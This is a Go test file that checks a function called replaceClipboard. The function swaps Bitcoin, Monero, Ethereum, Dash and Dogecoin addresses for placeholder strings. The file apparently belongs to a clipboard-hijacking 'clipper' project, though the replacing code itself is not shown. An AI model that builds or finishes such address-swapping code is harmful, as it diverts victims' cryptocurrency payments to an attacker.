package main

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

var (
	XMR_ADDRESSES_TO_TEST = []string{"4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"}
	BTC_ADDRESSES_TO_TEST = []string{"bc1qp3f7vnmuj4pjxpfvkvf7yznac9h9r5arlv4fpv"}
	ETH_ADDRESSES_TO_TEST = []string{"0x71C7656EC7ab88b098defB751B7401B5f6d8976F"}
	DASH_ADDRESSES_TO_TEST = []string{"XpESxaUmonkq8RaLLp46Brx2K39ggQe226"}
	DOGE_ADDRESSES_TO_TEST = []string{"DMuFDCTwxdqzfWrCEE7HiMxBonKVU49Fz4"}
)



func TestBitcoinMatch(t *testing.T) {
	for _, address := range BTC_ADDRESSES_TO_TEST{
		var expected string = "replace_me_btc"
		actual, err := replaceClipboard(address)
		assert.Equal(t, actual, expected)
		assert.Equal(t, err, nil)
	}
}

func TestMoneroMatch(t *testing.T) {
	for _, address := range XMR_ADDRESSES_TO_TEST {
		var expected string = "replace_me_xmr"
		actual, err := replaceClipboard(address)
		assert.Equal(t, actual, expected)
		assert.Equal(t, err, nil)
	}
}

func TestEthereumMatch(t *testing.T) {
	for _, address := range ETH_ADDRESSES_TO_TEST {
		var expected string = "replace_me_eth"
		actual, err := replaceClipboard(address)
		assert.Equal(t, actual, expected)
		assert.Equal(t, err, nil)
	}
}

func TestDashMatch(t *testing.T) {
	for _, address := range DASH_ADDRESSES_TO_TEST {
		var expected string = "replace_me_dash"
		actual, err := replaceClipboard(address)
		assert.Equal(t, actual, expected)
		assert.Equal(t, err, nil)
	}
}

func TestDogeMatch(t *testing.T) {
	for _, address := range DOGE_ADDRESSES_TO_TEST {
		var expected string = "replace_me_doge"
		actual, err := replaceClipboard(address)
		assert.Equal(t, actual, expected)
		assert.Equal(t, err, nil)
	}
}
